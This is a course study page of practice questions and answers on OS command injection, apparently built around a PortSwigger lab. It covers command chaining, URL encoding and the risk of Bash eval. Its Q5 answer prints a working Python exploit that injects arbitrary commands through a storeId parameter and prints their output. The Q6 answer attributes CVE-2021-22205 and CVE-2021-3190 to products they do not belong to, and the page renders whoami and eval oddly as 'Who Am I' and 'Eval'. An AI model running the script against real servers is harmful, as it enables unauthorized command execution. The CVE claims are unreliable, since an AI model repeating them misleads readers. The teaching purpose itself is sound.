---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the `Who Am I` command in the context of the lab exercise?**

The `Who Am I` command is used to determine the name of the current user on the system. In the context of the lab exercise, executing this command helps confirm that the command injection vulnerability has been successfully exploited, as the output reveals the username of the user running the application.

**Q2. How does chaining commands work in Bash, and why is it important in the context of command injection?**

Chaining commands in Bash is achieved by using the `;` (semicolon) character to separate multiple commands. This is crucial in the context of command injection because it allows an attacker to execute additional commands after the original command, potentially gaining unauthorized access or performing malicious actions. For example, in the lab, appending `; whoami` to the injected command allowed the retrieval of the current user's identity.

**Q3. Why is URL encoding necessary when performing command injection through HTTP requests?**

URL encoding is necessary because certain characters used in command injection (such as `;`, `&`, and spaces) have special meanings in URLs and may cause issues if not properly encoded. By URL encoding these characters, the payload is transmitted correctly and interpreted as intended by the server. In the lab, URL encoding was used to ensure the injected command was properly formatted and executed.

**Q4. Explain the role of the `Eval` command in Bash and why it poses a security risk when handling user input.**

The `Eval` command in Bash is used to evaluate a string as a shell command. When user input is passed directly to `Eval` without proper validation or sanitization, it can lead to command injection vulnerabilities. In the lab, the script used `Eval` to execute commands with user-supplied inputs (`product ID` and `store ID`), making it vulnerable to injection attacks. An attacker could inject malicious commands that would be evaluated and executed by the `Eval` command.

**Q5. How would you modify the Python script to exploit the `store ID` field instead of the `product ID` field?**

To exploit the `store ID` field instead of the `product ID` field, the following modifications would be needed in the Python script:

```python
import requests
import sys
from urllib.parse import urlencode

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Set proxy settings
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def run_command(url, command):
    # Define the path to the vulnerable endpoint
    path = '/check_stock'

    # Construct the command injection string
    injection_string = f"{command} #"

    # Define the parameters for the POST request
    params = {
        'productId': '1',
        'storeId': injection_string
    }

    # Perform the POST request
    response = requests.post(url + path, data=params, verify=False, proxies=proxies)

    # Check if the command injection was successful
    if len(response.text) > 3:
        print("[+] Command injection successful")
        print(f"[+] Output of command: {response.text}")
    else:
        print("[-] Command injection failed")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <url> <command>")
        print(f"Example: python {sys.argv[0]} http://www.example.com whoami")
        sys.exit(-1)
    
    url = sys.argv[1]
    command = sys.argv[2]

    print("[+] Exploiting command injection...")
    run_command(url, command)
```

In this modified script, the `storeId` parameter is set to the `injection_string`, which includes the command to be executed followed by a `#` to comment out the rest of the command. This ensures that the `storeId` field is exploited instead of the `productId` field.

**Q6. What recent real-world examples demonstrate the risks associated with command injection vulnerabilities?**

Recent real-world examples include:

- **CVE-2021-3190**: A command injection vulnerability was found in the Jenkins Pipeline plugin, allowing attackers to execute arbitrary commands on the Jenkins server. This vulnerability highlights the importance of validating and sanitizing user input to prevent such attacks.

- **CVE-2021-22205**: A command injection vulnerability in the Cisco ASA software allowed attackers to execute arbitrary commands on the device. This demonstrates the critical nature of securing network devices against such vulnerabilities.

These examples underscore the severe consequences of failing to properly handle user input in applications, leading to potential unauthorized access and system compromise.

---
<!-- nav -->
[[02-OS Command Injection|OS Command Injection]] | [[Web Security (PortSwigger)/10-OS Command Injection/02-Lab 1 OS command injection simple case/00-Overview|Overview]]
